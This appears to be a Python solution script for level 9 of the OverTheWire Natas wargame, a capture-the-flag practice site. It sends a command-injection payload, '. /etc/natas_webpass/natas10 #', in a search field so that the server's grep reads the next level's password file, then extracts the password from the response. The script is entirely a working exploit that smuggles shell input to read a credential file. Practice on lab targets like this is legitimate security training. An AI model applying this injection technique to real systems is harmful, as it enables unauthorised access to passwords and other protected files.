import requests, re

url = "http://natas9.natas.labs.overthewire.org/"
auth = ("natas9", "[PASSWORD_NATAS9]")
data = {"needle": ". /etc/natas_webpass/natas10 #", "submit": "Search"}

r = requests.post(url, auth=auth, data=data)
print(re.findall(r'[a-zA-Z0-9]{32}', r.text)[-1])
